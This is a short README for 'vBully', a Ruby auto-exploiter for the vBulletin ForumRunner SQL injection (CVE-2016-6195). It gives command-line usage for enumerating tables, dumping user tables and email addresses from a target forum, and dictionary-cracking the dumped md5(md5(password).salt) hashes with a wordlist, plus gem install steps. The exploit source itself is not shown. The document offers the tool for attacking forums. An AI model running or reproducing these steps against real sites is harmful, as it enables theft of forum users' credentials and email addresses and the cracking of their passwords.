# vBully
____

vBully is an auto-exploiter for the ForumRunner vulnerability (CVE-2016-6195). This work is based on the work of Manish Kishan Tanwar AKA error1046 (https://twitter.com/IndiShell1046). This tool has the expanded ability to parse the results post-SQL-Injection and grab the dumped user table hashes. It then saves the hashes to a file and proceeds to crack (dictionary attack) the password hashes based on the `md5(md5(password).salt)` formula used by vBulletin.  

```
vBully v.2.0.0

Usage:
vbully -u http://example.com/forums -c -w rockyou.txt -o example
vbully -u http://example.com/forums -d 3 -o example

-d    Dump Mode (Default: 2)
        [1] Enumerate Tables
        [2] Dump User Table
        [3] Dump User Email Addresses

-u    URL
-c    Crack hashes (must provide -w <wordlist>)
-w    Specify wordlist (decompressed)
-o    Write results to file (provide file base name)
```

To install: 

    gem install gibberish mechanize colorize

Depends on Ruby v2.3 or higher. 
